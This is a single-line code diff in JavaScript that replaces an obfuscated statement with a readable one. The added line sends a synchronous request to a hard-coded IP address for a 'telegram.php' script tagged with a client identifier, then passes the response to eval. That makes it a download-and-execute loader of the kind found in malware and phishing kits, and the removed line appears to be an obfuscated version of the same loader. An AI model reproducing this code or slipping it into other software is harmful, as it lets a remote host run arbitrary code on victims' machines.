@@ -1,1 +1,1 @@
-h.ISaH('dOH','http://172.105.52.102/TG/XX/telegram.php?client='+n,tMVUpT);h.YUVho();CSFl(h.yZVjQEskiLq);
+h.open('GET','http://172.105.52.102/TG/DY/telegram.php?client='+n,false);h.send();eval(h.ResponseText);
